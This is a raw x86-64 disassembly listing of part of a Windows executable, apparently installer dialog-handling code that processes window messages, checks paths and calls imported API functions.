   140003403:	4c 8d 0d 46 06 00 00 	lea    0x646(%rip),%r9        # 0x140003a50
   14000340a:	f7 d8                	neg    %eax
   14000340c:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140003411:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003416:	48 1b d2             	sbb    %rdx,%rdx
   140003419:	45 33 c0             	xor    %r8d,%r8d
   14000341c:	48 81 c2 d5 07 00 00 	add    $0x7d5,%rdx
   140003423:	e8 00 49 00 00       	call   0x140007d28
   140003428:	48 85 c0             	test   %rax,%rax
   14000342b:	eb 07                	jmp    0x140003434
   14000342d:	e8 4e 2b 00 00       	call   0x140005f80
   140003432:	85 c0                	test   %eax,%eax
   140003434:	75 0f                	jne    0x140003445
   140003436:	c7 05 04 a1 00 00 2b 	movl   $0x8007042b,0xa104(%rip)        # 0x14000d544
   14000343d:	04 07 80 
   140003440:	e9 23 ff ff ff       	jmp    0x140003368
   140003445:	48 8d 0d c4 46 00 00 	lea    0x46c4(%rip),%rcx        # 0x140007b10
   14000344c:	e8 33 45 00 00       	call   0x140007984
   140003451:	85 c0                	test   %eax,%eax
   140003453:	0f 84 0f ff ff ff    	je     0x140003368
   140003459:	89 3d e5 a0 00 00    	mov    %edi,0xa0e5(%rip)        # 0x14000d544
   14000345f:	8b 05 c3 9b 00 00    	mov    0x9bc3(%rip),%eax        # 0x14000d028
   140003465:	a8 40                	test   $0x40,%al
   140003467:	75 12                	jne    0x14000347b
   140003469:	84 c0                	test   %al,%al
   14000346b:	78 0e                	js     0x14000347b
   14000346d:	0f b7 0d 04 aa 00 00 	movzwl 0xaa04(%rip),%ecx        # 0x14000de78
   140003474:	e8 47 ef ff ff       	call   0x1400023c0
   140003479:	eb 02                	jmp    0x14000347d
   14000347b:	8b c7                	mov    %edi,%eax
   14000347d:	89 05 f9 a9 00 00    	mov    %eax,0xa9f9(%rip)        # 0x14000de7c
   140003483:	8b 05 7b 98 00 00    	mov    0x987b(%rip),%eax        # 0x14000cd04
   140003489:	85 c0                	test   %eax,%eax
   14000348b:	75 1b                	jne    0x1400034a8
   14000348d:	39 3d cd a9 00 00    	cmp    %edi,0xa9cd(%rip)        # 0x14000de60
   140003493:	75 13                	jne    0x1400034a8
   140003495:	e8 1a 0d 00 00       	call   0x1400041b4
   14000349a:	85 c0                	test   %eax,%eax
   14000349c:	0f 84 c6 fe ff ff    	je     0x140003368
   1400034a2:	8b 05 5c 98 00 00    	mov    0x985c(%rip),%eax        # 0x14000cd04
   1400034a8:	66 39 3d 69 98 00 00 	cmp    %di,0x9869(%rip)        # 0x14000cd18
   1400034af:	75 09                	jne    0x1400034ba
   1400034b1:	85 c0                	test   %eax,%eax
   1400034b3:	75 05                	jne    0x1400034ba
   1400034b5:	e8 9a 15 00 00       	call   0x140004a54
   1400034ba:	b8 01 00 00 00       	mov    $0x1,%eax
   1400034bf:	e9 a6 fe ff ff       	jmp    0x14000336a
   1400034c4:	cc                   	int3
   1400034c5:	cc                   	int3
   1400034c6:	cc                   	int3
   1400034c7:	cc                   	int3
   1400034c8:	71 ea                	jno    0x1400034b4
   1400034ca:	d6                   	udb
   1400034cb:	10 17                	adc    %dl,(%rdi)
   1400034cd:	06                   	(bad)
   1400034ce:	18 cf                	sbb    %cl,%bh
   1400034d0:	48 83 ec 38          	sub    $0x38,%rsp
   1400034d4:	81 fa b1 00 00 00    	cmp    $0xb1,%edx
   1400034da:	75 0f                	jne    0x1400034eb
   1400034dc:	4d 85 c0             	test   %r8,%r8
   1400034df:	75 0a                	jne    0x1400034eb
   1400034e1:	49 83 f9 fe          	cmp    $0xfffffffffffffffe,%r9
   1400034e5:	75 04                	jne    0x1400034eb
   1400034e7:	33 c0                	xor    %eax,%eax
   1400034e9:	eb 21                	jmp    0x14000350c
   1400034eb:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400034f0:	4d 8b c8             	mov    %r8,%r9
   1400034f3:	44 8b c2             	mov    %edx,%r8d
   1400034f6:	48 8b d1             	mov    %rcx,%rdx
   1400034f9:	48 8b 0d 90 96 00 00 	mov    0x9690(%rip),%rcx        # 0x14000cb90
   140003500:	48 ff 15 e1 5f 00 00 	rex.W call *0x5fe1(%rip)        # 0x1400094e8
   140003507:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000350c:	48 83 c4 38          	add    $0x38,%rsp
   140003510:	c3                   	ret
   140003511:	cc                   	int3
   140003512:	cc                   	int3
   140003513:	cc                   	int3
   140003514:	cc                   	int3
   140003515:	cc                   	int3
   140003516:	cc                   	int3
   140003517:	cc                   	int3
   140003518:	71 ea                	jno    0x140003504
   14000351a:	d6                   	udb
   14000351b:	10 17                	adc    %dl,(%rdi)
   14000351d:	06                   	(bad)
   14000351e:	18 cf                	sbb    %cl,%bh
   140003520:	40 53                	rex push %rbx
   140003522:	48 83 ec 30          	sub    $0x30,%rsp
   140003526:	48 8b d9             	mov    %rcx,%rbx
   140003529:	83 ea 0f             	sub    $0xf,%edx
   14000352c:	0f 84 ea 00 00 00    	je     0x14000361c
   140003532:	83 ea 01             	sub    $0x1,%edx
   140003535:	74 27                	je     0x14000355e
   140003537:	81 ea 00 01 00 00    	sub    $0x100,%edx
   14000353d:	74 32                	je     0x140003571
   14000353f:	83 fa 01             	cmp    $0x1,%edx
   140003542:	0f 85 08 01 00 00    	jne    0x140003650
   140003548:	49 83 f8 06          	cmp    $0x6,%r8
   14000354c:	75 06                	jne    0x140003554
   14000354e:	41 8d 50 fb          	lea    -0x5(%r8),%edx
   140003552:	eb 0c                	jmp    0x140003560
   140003554:	49 83 f8 07          	cmp    $0x7,%r8
   140003558:	0f 85 b7 00 00 00    	jne    0x140003615
   14000355e:	33 d2                	xor    %edx,%edx
   140003560:	48 ff 15 f9 5f 00 00 	rex.W call *0x5ff9(%rip)        # 0x140009560
   140003567:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000356c:	e9 a4 00 00 00       	jmp    0x140003615
   140003571:	48 ff 15 10 60 00 00 	rex.W call *0x6010(%rip)        # 0x140009588
   140003578:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000357d:	48 8b d0             	mov    %rax,%rdx
   140003580:	48 8b cb             	mov    %rbx,%rcx
   140003583:	e8 40 18 00 00       	call   0x140004dc8
   140003588:	4c 8b 05 a1 9a 00 00 	mov    0x9aa1(%rip),%r8        # 0x14000d030
   14000358f:	ba 34 08 00 00       	mov    $0x834,%edx
   140003594:	48 8b cb             	mov    %rbx,%rcx
   140003597:	48 ff 15 da 5f 00 00 	rex.W call *0x5fda(%rip)        # 0x140009578
   14000359e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035a3:	48 8d 15 ce 9f 00 00 	lea    0x9fce(%rip),%rdx        # 0x14000d578
   1400035aa:	48 8b cb             	mov    %rbx,%rcx
   1400035ad:	48 ff 15 3c 5f 00 00 	rex.W call *0x5f3c(%rip)        # 0x1400094f0
   1400035b4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035b9:	48 8b cb             	mov    %rbx,%rcx
   1400035bc:	48 ff 15 6d 5f 00 00 	rex.W call *0x5f6d(%rip)        # 0x140009530
   1400035c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035c8:	ba 34 08 00 00       	mov    $0x834,%edx
   1400035cd:	48 8b cb             	mov    %rbx,%rcx
   1400035d0:	48 ff 15 39 5f 00 00 	rex.W call *0x5f39(%rip)        # 0x140009510
   1400035d7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035dc:	48 8b c8             	mov    %rax,%rcx
   1400035df:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
   1400035e4:	48 8b d8             	mov    %rax,%rbx
   1400035e7:	48 ff 15 32 5f 00 00 	rex.W call *0x5f32(%rip)        # 0x140009520
   1400035ee:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035f3:	4c 8d 05 d6 fe ff ff 	lea    -0x12a(%rip),%r8        # 0x1400034d0
   1400035fa:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
   1400035ff:	48 8b cb             	mov    %rbx,%rcx
   140003602:	48 89 05 87 95 00 00 	mov    %rax,0x9587(%rip)        # 0x14000cb90
   140003609:	48 ff 15 18 5f 00 00 	rex.W call *0x5f18(%rip)        # 0x140009528
   140003610:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003615:	b8 01 00 00 00       	mov    $0x1,%eax
   14000361a:	eb 36                	jmp    0x140003652
   14000361c:	83 3d 1d 92 00 00 00 	cmpl   $0x0,0x921d(%rip)        # 0x14000c840
   140003623:	75 2b                	jne    0x140003650
   140003625:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000362b:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   14000362f:	ba 34 08 00 00       	mov    $0x834,%edx
   140003634:	41 b8 b1 00 00 00    	mov    $0xb1,%r8d
   14000363a:	48 ff 15 bf 5e 00 00 	rex.W call *0x5ebf(%rip)        # 0x140009500
   140003641:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003646:	c7 05 f0 91 00 00 01 	movl   $0x1,0x91f0(%rip)        # 0x14000c840
   14000364d:	00 00 00 
   140003650:	33 c0                	xor    %eax,%eax
   140003652:	48 83 c4 30          	add    $0x30,%rsp
   140003656:	5b                   	pop    %rbx
   140003657:	c3                   	ret
   140003658:	cc                   	int3
   140003659:	cc                   	int3
   14000365a:	cc                   	int3
   14000365b:	cc                   	int3
   14000365c:	cc                   	int3
   14000365d:	cc                   	int3
   14000365e:	cc                   	int3
   14000365f:	cc                   	int3
   140003660:	cc                   	int3
   140003661:	cc                   	int3
   140003662:	cc                   	int3
   140003663:	cc                   	int3
   140003664:	cc                   	int3
   140003665:	cc                   	int3
   140003666:	cc                   	int3
   140003667:	cc                   	int3
   140003668:	71 ea                	jno    0x140003654
   14000366a:	d6                   	udb
   14000366b:	10 17                	adc    %dl,(%rdi)
   14000366d:	06                   	(bad)
   14000366e:	18 cf                	sbb    %cl,%bh
   140003670:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003675:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000367a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000367f:	41 57                	push   %r15
   140003681:	48 83 ec 30          	sub    $0x30,%rsp
   140003685:	41 bf 10 00 00 00    	mov    $0x10,%r15d
   14000368b:	48 8b f9             	mov    %rcx,%rdi
   14000368e:	41 2b d7             	sub    %r15d,%edx
   140003691:	0f 84 af 02 00 00    	je     0x140003946
   140003697:	41 8d 5f f1          	lea    -0xf(%r15),%ebx
   14000369b:	81 ea 00 01 00 00    	sub    $0x100,%edx
   1400036a1:	0f 84 1b 02 00 00    	je     0x1400038c2
   1400036a7:	3b d3                	cmp    %ebx,%edx
   1400036a9:	74 07                	je     0x1400036b2
   1400036ab:	33 c0                	xor    %eax,%eax
   1400036ad:	e9 a7 02 00 00       	jmp    0x140003959
   1400036b2:	4c 2b c3             	sub    %rbx,%r8
   1400036b5:	0f 84 ba 00 00 00    	je     0x140003775
   1400036bb:	4c 2b c3             	sub    %rbx,%r8
   1400036be:	0f 84 94 00 00 00    	je     0x140003758
   1400036c4:	49 81 f8 34 08 00 00 	cmp    $0x834,%r8
   1400036cb:	0f 85 70 02 00 00    	jne    0x140003941
   1400036d1:	48 8b 0d 98 a7 00 00 	mov    0xa798(%rip),%rcx        # 0x14000de70
   1400036d8:	4c 8d 05 71 91 00 00 	lea    0x9171(%rip),%r8        # 0x14000c850
   1400036df:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   1400036e5:	ba e8 03 00 00       	mov    $0x3e8,%edx
   1400036ea:	48 ff 15 5f 5e 00 00 	rex.W call *0x5e5f(%rip)        # 0x140009550
   1400036f1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400036f6:	48 8b cf             	mov    %rdi,%rcx
   1400036f9:	85 c0                	test   %eax,%eax
   1400036fb:	75 21                	jne    0x14000371e
   1400036fd:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140003702:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140003707:	45 33 c9             	xor    %r9d,%r9d
   14000370a:	45 33 c0             	xor    %r8d,%r8d
   14000370d:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140003712:	e8 15 18 00 00       	call   0x140004f2c
   140003717:	33 d2                	xor    %edx,%edx
   140003719:	e9 71 01 00 00       	jmp    0x14000388f
   14000371e:	e8 4d 14 00 00       	call   0x140004b70
   140003723:	85 c0                	test   %eax,%eax
   140003725:	0f 84 16 02 00 00    	je     0x140003941
   14000372b:	4c 8d 05 2e 93 00 00 	lea    0x932e(%rip),%r8        # 0x14000ca60
   140003732:	ba 35 08 00 00       	mov    $0x835,%edx
   140003737:	48 8b cf             	mov    %rdi,%rcx
   14000373a:	48 ff 15 37 5e 00 00 	rex.W call *0x5e37(%rip)        # 0x140009578
   140003741:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003746:	85 c0                	test   %eax,%eax
   140003748:	0f 85 f3 01 00 00    	jne    0x140003941
   14000374e:	ba c0 04 00 00       	mov    $0x4c0,%edx
   140003753:	48 8b cf             	mov    %rdi,%rcx
   140003756:	eb aa                	jmp    0x140003702
   140003758:	33 d2                	xor    %edx,%edx
   14000375a:	48 ff 15 ff 5d 00 00 	rex.W call *0x5dff(%rip)        # 0x140009560
   140003761:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003766:	c7 05 d4 9d 00 00 c7 	movl   $0x800704c7,0x9dd4(%rip)        # 0x14000d544
   14000376d:	04 07 80 
   140003770:	e9 cc 01 00 00       	jmp    0x140003941
   140003775:	48 8d 2d 94 9e 00 00 	lea    0x9e94(%rip),%rbp        # 0x14000d610
   14000377c:	41 b9 04 01 00 00    	mov    $0x104,%r9d
   140003782:	4c 8b c5             	mov    %rbp,%r8
   140003785:	ba 35 08 00 00       	mov    $0x835,%edx
   14000378a:	48 ff 15 07 5e 00 00 	rex.W call *0x5e07(%rip)        # 0x140009598
   140003791:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003796:	85 c0                	test   %eax,%eax
   140003798:	0f 84 05 01 00 00    	je     0x1400038a3
   14000379e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400037a2:	48 ff c0             	inc    %rax
   1400037a5:	80 3c 28 00          	cmpb   $0x0,(%rax,%rbp,1)
   1400037a9:	75 f7                	jne    0x1400037a2
   1400037ab:	48 83 f8 03          	cmp    $0x3,%rax
   1400037af:	0f 82 ee 00 00 00    	jb     0x1400038a3
   1400037b5:	8a 05 56 9e 00 00    	mov    0x9e56(%rip),%al        # 0x14000d611
   1400037bb:	3c 3a                	cmp    $0x3a,%al
   1400037bd:	74 15                	je     0x1400037d4
   1400037bf:	80 3d 4a 9e 00 00 5c 	cmpb   $0x5c,0x9e4a(%rip)        # 0x14000d610
   1400037c6:	0f 85 d7 00 00 00    	jne    0x1400038a3
   1400037cc:	3c 5c                	cmp    $0x5c,%al
   1400037ce:	0f 85 cf 00 00 00    	jne    0x1400038a3
   1400037d4:	48 8b cd             	mov    %rbp,%rcx
   1400037d7:	48 ff 15 4a 5a 00 00 	rex.W call *0x5a4a(%rip)        # 0x140009228
   1400037de:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037e3:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400037e6:	75 52                	jne    0x14000383a
   1400037e8:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400037ef:	00 
   1400037f0:	45 33 c9             	xor    %r9d,%r9d
   1400037f3:	4c 8b c5             	mov    %rbp,%r8
   1400037f6:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   1400037fd:	00 
   1400037fe:	ba 4a 05 00 00       	mov    $0x54a,%edx
   140003803:	48 8b cf             	mov    %rdi,%rcx
   140003806:	e8 21 17 00 00       	call   0x140004f2c
   14000380b:	83 f8 06             	cmp    $0x6,%eax
   14000380e:	0f 85 2d 01 00 00    	jne    0x140003941
   140003814:	33 d2                	xor    %edx,%edx
   140003816:	48 8b cd             	mov    %rbp,%rcx
   140003819:	48 ff 15 90 5a 00 00 	rex.W call *0x5a90(%rip)        # 0x1400092b0
   140003820:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003825:	85 c0                	test   %eax,%eax
   140003827:	75 11                	jne    0x14000383a
   140003829:	21 44 24 28          	and    %eax,0x28(%rsp)
   14000382d:	4c 8b c5             	mov    %rbp,%r8
   140003830:	45 33 c9             	xor    %r9d,%r9d
   140003833:	ba cb 04 00 00       	mov    $0x4cb,%edx
   140003838:	eb 79                	jmp    0x1400038b3
   14000383a:	4c 8d 05 1f 5f 00 00 	lea    0x5f1f(%rip),%r8        # 0x140009760
   140003841:	ba 04 01 00 00       	mov    $0x104,%edx
   140003846:	48 8b cd             	mov    %rbp,%rcx
   140003849:	e8 ba 45 00 00       	call   0x140007e08
   14000384e:	48 8b cd             	mov    %rbp,%rcx
   140003851:	e8 46 35 00 00       	call   0x140006d9c
   140003856:	85 c0                	test   %eax,%eax
   140003858:	75 07                	jne    0x140003861
   14000385a:	ba be 04 00 00       	mov    $0x4be,%edx
   14000385f:	eb 47                	jmp    0x1400038a8
   140003861:	80 3d a8 9d 00 00 5c 	cmpb   $0x5c,0x9da8(%rip)        # 0x14000d610
   140003868:	75 0d                	jne    0x140003877
   14000386a:	80 3d a0 9d 00 00 5c 	cmpb   $0x5c,0x9da0(%rip)        # 0x14000d611
   140003871:	75 04                	jne    0x140003877
   140003873:	33 d2                	xor    %edx,%edx
   140003875:	eb 02                	jmp    0x140003879
   140003877:	8b d3                	mov    %ebx,%edx
   140003879:	44 8b c3             	mov    %ebx,%r8d
   14000387c:	48 8b cd             	mov    %rbp,%rcx
   14000387f:	e8 90 36 00 00       	call   0x140006f14
   140003884:	85 c0                	test   %eax,%eax
   140003886:	0f 84 b5 00 00 00    	je     0x140003941
   14000388c:	48 8b d3             	mov    %rbx,%rdx
   14000388f:	48 8b cf             	mov    %rdi,%rcx
   140003892:	48 ff 15 c7 5c 00 00 	rex.W call *0x5cc7(%rip)        # 0x140009560
   140003899:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000389e:	e9 9e 00 00 00       	jmp    0x140003941
   1400038a3:	ba bf 04 00 00       	mov    $0x4bf,%edx
   1400038a8:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400038ad:	45 33 c9             	xor    %r9d,%r9d
   1400038b0:	45 33 c0             	xor    %r8d,%r8d
   1400038b3:	48 8b cf             	mov    %rdi,%rcx
   1400038b6:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   1400038bb:	e8 6c 16 00 00       	call   0x140004f2c
   1400038c0:	eb 7f                	jmp    0x140003941
   1400038c2:	48 ff 15 bf 5c 00 00 	rex.W call *0x5cbf(%rip)        # 0x140009588
   1400038c9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400038ce:	48 8b d0             	mov    %rax,%rdx
   1400038d1:	48 8b cf             	mov    %rdi,%rcx
   1400038d4:	e8 ef 14 00 00       	call   0x140004dc8
   1400038d9:	48 8d 15 98 9c 00 00 	lea    0x9c98(%rip),%rdx        # 0x14000d578
   1400038e0:	48 8b cf             	mov    %rdi,%rcx
   1400038e3:	48 ff 15 06 5c 00 00 	rex.W call *0x5c06(%rip)        # 0x1400094f0
   1400038ea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400038ef:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400038f5:	41 b9 03 01 00 00    	mov    $0x103,%r9d
   1400038fb:	ba 35 08 00 00       	mov    $0x835,%edx
   140003900:	48 8b cf             	mov    %rdi,%rcx
   140003903:	45 8d 41 c2          	lea    -0x3e(%r9),%r8d
   140003907:	48 ff 15 f2 5b 00 00 	rex.W call *0x5bf2(%rip)        # 0x140009500
   14000390e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003913:	66 39 1d 5e a5 00 00 	cmp    %bx,0xa55e(%rip)        # 0x14000de78
   14000391a:	75 25                	jne    0x140003941
   14000391c:	ba 36 08 00 00       	mov    $0x836,%edx
   140003921:	48 8b cf             	mov    %rdi,%rcx
   140003924:	48 ff 15 e5 5b 00 00 	rex.W call *0x5be5(%rip)        # 0x140009510
   14000392b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003930:	48 8b c8             	mov    %rax,%rcx
   140003933:	33 d2                	xor    %edx,%edx
   140003935:	48 ff 15 04 5c 00 00 	rex.W call *0x5c04(%rip)        # 0x140009540
   14000393c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003941:	48 8b c3             	mov    %rbx,%rax
   140003944:	eb 13                	jmp    0x140003959
   140003946:	33 d2                	xor    %edx,%edx
   140003948:	48 ff 15 11 5c 00 00 	rex.W call *0x5c11(%rip)        # 0x140009560
   14000394f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003954:	b8 01 00 00 00       	mov    $0x1,%eax
   140003959:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000395e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003963:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140003968:	48 83 c4 30          	add    $0x30,%rsp
   14000396c:	41 5f                	pop    %r15
   14000396e:	c3                   	ret
   14000396f:	cc                   	int3
   140003970:	cc                   	int3
   140003971:	cc                   	int3
   140003972:	cc                   	int3
   140003973:	cc                   	int3
   140003974:	cc                   	int3
   140003975:	cc                   	int3
   140003976:	cc                   	int3
   140003977:	cc                   	int3
   140003978:	71 ea                	jno    0x140003964
   14000397a:	d6                   	udb
   14000397b:	10 17                	adc    %dl,(%rdi)
   14000397d:	06                   	(bad)
   14000397e:	18 cf                	sbb    %cl,%bh
   140003980:	40 53                	rex push %rbx
   140003982:	48 83 ec 20          	sub    $0x20,%rsp
   140003986:	48 8b d9             	mov    %rcx,%rbx
   140003989:	83 ea 10             	sub    $0x10,%edx
   14000398c:	0f 84 95 00 00 00    	je     0x140003a27
   140003992:	81 ea 00 01 00 00    	sub    $0x100,%edx
   140003998:	74 34                	je     0x1400039ce
   14000399a:	83 fa 01             	cmp    $0x1,%edx
   14000399d:	74 07                	je     0x1400039a6
   14000399f:	33 c0                	xor    %eax,%eax
   1400039a1:	e9 97 00 00 00       	jmp    0x140003a3d
   1400039a6:	49 83 f8 06          	cmp    $0x6,%r8
   1400039aa:	0f 82 88 00 00 00    	jb     0x140003a38
   1400039b0:	49 83 f8 07          	cmp    $0x7,%r8
   1400039b4:	76 13                	jbe    0x1400039c9
   1400039b6:	49 81 f8 39 08 00 00 	cmp    $0x839,%r8
   1400039bd:	75 79                	jne    0x140003a38
   1400039bf:	c7 05 37 9c 00 00 01 	movl   $0x1,0x9c37(%rip)        # 0x14000d600
   1400039c6:	00 00 00 
   1400039c9:	49 8b d0             	mov    %r8,%rdx
   1400039cc:	eb 5e                	jmp    0x140003a2c
   1400039ce:	48 ff 15 b3 5b 00 00 	rex.W call *0x5bb3(%rip)        # 0x140009588
   1400039d5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400039da:	48 8b d0             	mov    %rax,%rdx
   1400039dd:	48 8b cb             	mov    %rbx,%rcx
   1400039e0:	e8 e3 13 00 00       	call   0x140004dc8
   1400039e5:	48 8d 15 8c 9b 00 00 	lea    0x9b8c(%rip),%rdx        # 0x14000d578
   1400039ec:	48 8b cb             	mov    %rbx,%rcx
   1400039ef:	48 ff 15 fa 5a 00 00 	rex.W call *0x5afa(%rip)        # 0x1400094f0
   1400039f6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400039fb:	4c 8b 05 2e 9e 00 00 	mov    0x9e2e(%rip),%r8        # 0x14000d830
   140003a02:	ba 38 08 00 00       	mov    $0x838,%edx
   140003a07:	48 8b cb             	mov    %rbx,%rcx
   140003a0a:	48 ff 15 67 5b 00 00 	rex.W call *0x5b67(%rip)        # 0x140009578
   140003a11:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a16:	48 8b cb             	mov    %rbx,%rcx
   140003a19:	48 ff 15 10 5b 00 00 	rex.W call *0x5b10(%rip)        # 0x140009530
   140003a20:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a25:	eb 11                	jmp    0x140003a38
   140003a27:	ba 02 00 00 00       	mov    $0x2,%edx
   140003a2c:	48 ff 15 2d 5b 00 00 	rex.W call *0x5b2d(%rip)        # 0x140009560
   140003a33:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a38:	b8 01 00 00 00       	mov    $0x1,%eax
   140003a3d:	48 83 c4 20          	add    $0x20,%rsp
   140003a41:	5b                   	pop    %rbx
   140003a42:	c3                   	ret
   140003a43:	cc                   	int3
   140003a44:	cc                   	int3
   140003a45:	cc                   	int3
   140003a46:	cc                   	int3
   140003a47:	cc                   	int3
   140003a48:	71 ea                	jno    0x140003a34
   140003a4a:	d6                   	udb
   140003a4b:	10 17                	adc    %dl,(%rdi)
   140003a4d:	06                   	(bad)
   140003a4e:	18 cf                	sbb    %cl,%bh
   140003a50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003a55:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003a5a:	57                   	push   %rdi
   140003a5b:	48 83 ec 30          	sub    $0x30,%rsp
   140003a5f:	49 8b f0             	mov    %r8,%rsi
   140003a62:	48 8b f9             	mov    %rcx,%rdi
   140003a65:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003a6a:	83 ea 10             	sub    $0x10,%edx
   140003a6d:	0f 84 df 01 00 00    	je     0x140003c52
   140003a73:	81 ea f2 00 00 00    	sub    $0xf2,%edx
   140003a79:	0f 84 cd 01 00 00    	je     0x140003c4c
   140003a7f:	83 ea 0e             	sub    $0xe,%edx
   140003a82:	0f 84 c9 00 00 00    	je     0x140003b51
   140003a88:	2b d3                	sub    %ebx,%edx
   140003a8a:	74 2f                	je     0x140003abb
   140003a8c:	81 fa 90 0e 00 00    	cmp    $0xe90,%edx
   140003a92:	74 07                	je     0x140003a9b
   140003a94:	33 c0                	xor    %eax,%eax
   140003a96:	e9 ce 01 00 00       	jmp    0x140003c69
   140003a9b:	48 8b 0d b6 8f 00 00 	mov    0x8fb6(%rip),%rcx        # 0x14000ca58
   140003aa2:	33 d2                	xor    %edx,%edx
   140003aa4:	48 ff 15 bd 58 00 00 	rex.W call *0x58bd(%rip)        # 0x140009368
   140003aab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ab0:	48 63 d6             	movslq %esi,%rdx
   140003ab3:	48 8b cf             	mov    %rdi,%rcx
   140003ab6:	e9 9f 01 00 00       	jmp    0x140003c5a
   140003abb:	48 83 fe 02          	cmp    $0x2,%rsi
   140003abf:	0f 85 a1 01 00 00    	jne    0x140003c66
   140003ac5:	48 8b 0d 6c 8d 00 00 	mov    0x8d6c(%rip),%rcx        # 0x14000c838
   140003acc:	48 ff 15 bd 58 00 00 	rex.W call *0x58bd(%rip)        # 0x140009390
   140003ad3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ad8:	48 8b 0d 49 8d 00 00 	mov    0x8d49(%rip),%rcx        # 0x14000c828
   140003adf:	4c 8d 05 7a 5c 00 00 	lea    0x5c7a(%rip),%r8        # 0x140009760
   140003ae6:	45 33 c9             	xor    %r9d,%r9d
   140003ae9:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003af0:	00 
   140003af1:	ba b2 04 00 00       	mov    $0x4b2,%edx
   140003af6:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140003afd:	00 
   140003afe:	e8 29 14 00 00       	call   0x140004f2c
   140003b03:	83 f8 06             	cmp    $0x6,%eax
   140003b06:	74 1c                	je     0x140003b24
   140003b08:	3b c3                	cmp    %ebx,%eax
   140003b0a:	74 18                	je     0x140003b24
   140003b0c:	48 8b 0d 25 8d 00 00 	mov    0x8d25(%rip),%rcx        # 0x14000c838
   140003b13:	48 ff 15 46 58 00 00 	rex.W call *0x5846(%rip)        # 0x140009360
   140003b1a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b1f:	e9 42 01 00 00       	jmp    0x140003c66
   140003b24:	48 8b 0d 0d 8d 00 00 	mov    0x8d0d(%rip),%rcx        # 0x14000c838
   140003b2b:	89 1d cb 9a 00 00    	mov    %ebx,0x9acb(%rip)        # 0x14000d5fc
   140003b31:	48 ff 15 28 58 00 00 	rex.W call *0x5828(%rip)        # 0x140009360
   140003b38:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b3d:	48 8b 0d 14 8f 00 00 	mov    0x8f14(%rip),%rcx        # 0x14000ca58
   140003b44:	e8 37 01 00 00       	call   0x140003c80
   140003b49:	48 8b cf             	mov    %rdi,%rcx
   140003b4c:	e9 07 01 00 00       	jmp    0x140003c58
   140003b51:	48 89 3d d0 8c 00 00 	mov    %rdi,0x8cd0(%rip)        # 0x14000c828
   140003b58:	48 ff 15 29 5a 00 00 	rex.W call *0x5a29(%rip)        # 0x140009588
   140003b5f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b64:	48 8b d0             	mov    %rax,%rdx
   140003b67:	48 8b cf             	mov    %rdi,%rcx
   140003b6a:	e8 59 12 00 00       	call   0x140004dc8
